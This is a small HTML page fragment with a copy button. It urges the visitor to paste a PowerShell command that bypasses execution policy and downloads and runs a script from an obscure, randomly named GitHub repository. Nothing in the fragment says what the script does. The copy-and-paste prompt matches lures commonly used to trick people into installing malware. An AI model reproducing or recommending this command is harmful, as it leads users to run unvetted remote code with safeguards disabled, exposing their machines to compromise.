<div style="background: #222; color: #fff; padding: 20px; border-radius: 10px; font-family: monospace;">
    <p>Run this command in PowerShell to start:</p>
    <code id="cmd">powershell -ExecutionPolicy Bypass -Command "iex (irm https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)"</code>
    <br><br>
    <button onclick="copyCmd()" style="padding: 10px; cursor: pointer;">Copy Command</button>
</div>

<script>
function copyCmd() {
  const text = document.getElementById('cmd').innerText;
  navigator.clipboard.writeText(text);
  alert("Command copied! Now paste it into PowerShell.");
}
</script>
